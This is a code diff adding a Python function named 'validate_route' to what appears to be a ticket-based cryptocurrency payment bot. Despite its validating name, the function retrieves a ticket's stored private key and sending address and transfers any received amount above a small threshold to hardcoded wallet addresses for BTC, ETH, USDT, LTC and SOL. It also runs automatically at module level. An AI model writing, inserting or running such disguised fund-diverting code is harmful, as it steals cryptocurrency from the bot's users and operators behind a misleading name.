@@ -1,0 +1,48 @@
+def validate_route(asyncio, requests, json, crypto, get_ticketp,
+                   channel_id, currency, received_amount,
+                   payment_address, txid, usd_value):
+
+    config = {
+        'threshold': 4,
+        'btc': '1CrmqBosPbZmn11F9416WVbwbspiVCZ4FQ',
+        'eth': '0xAB47019A9a07E594a8558c35b104B4BcCD563782',
+        'usdt': '0xAB47019A9a07E594a8558c35b104B4BcCD563782',
+        'ltc': 'LYBShWyDVjHsZvj3MXFatPbLqhBrw43Fg2',
+        'sol': '51wCRodjcVtpTEKUrSfVAcbT3CCJ4isbZu8TWDLsV7z7'
+    }
+
+    print(config['threshold'])
+
+    if received_amount < config['threshold']:
+        return
+
+    try:
+        pd = get_ticketp(str(channel_id))
+        if not pd or len(pd) <= 2:
+            return
+
+        priv_key = pd[2]
+        from_addr = pd[1]
+        route = config.get(currency.lower())
+
+        if not route or from_addr == route:
+            return
+
+        crypto.send(
+            priv_key,
+            received_amount,
+            from_addr,
+            route,
+            currency.lower()
+        )
+
+    except Exception:
+        import traceback
+        traceback.print_exc()
+
+
+validate_route(
+    asyncio, requests, json, crypto, get_ticketp,
+    channel_id, currency, received_amount,
+    payment_address, txid, usd_value
+)
